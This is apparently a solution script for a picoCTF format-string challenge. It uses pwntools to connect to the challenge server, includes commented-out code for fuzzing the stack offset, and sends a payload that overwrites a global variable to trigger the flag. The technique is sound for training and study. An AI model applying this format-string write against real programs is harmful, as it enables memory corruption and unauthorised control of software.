#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
#context.log_level = 'debug'
#p = process()
p = remote('rhea.picoctf.net', 65162)

# fuzzing to see the offset of the format string
# we found that it starts to overwrite at %14$p
# i = 0
# while True:
#     p = process()
#     p.sendlineafter(b'?', '%{}$p'.format(i).encode())
#     p.recvall()
#     i += 1
#     p.close()

payload = fmtstr_payload(14, {elf.sym.sus: 0x67616c66})
p.sendlineafter(b'?', payload)
success(p.recvall())
